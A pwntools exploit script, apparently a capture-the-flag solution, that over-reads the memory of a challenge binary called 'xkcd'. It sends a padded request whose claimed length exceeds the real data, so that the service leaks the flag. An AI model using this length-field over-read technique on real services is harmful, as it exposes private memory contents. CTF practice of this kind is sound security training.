#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./xkcd"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

def exploit(conn):
  #just guess-work
  flag_size = 0x17

  #generate a request
  inp = "SERVER, ARE YOU STILL THERE?"
  inp += " "
  inp += "IF SO, REPLY"
  inp += " "
  inp += "\"" + "A"*0x200 + "\""
  inp += " "
  inp += "(" + str(0x200 + flag_size) + " LETTERS)"
  inp += " "

  #send a request and get flag
  conn.sendline(inp)
  conn.sendline("")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *main
      c
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

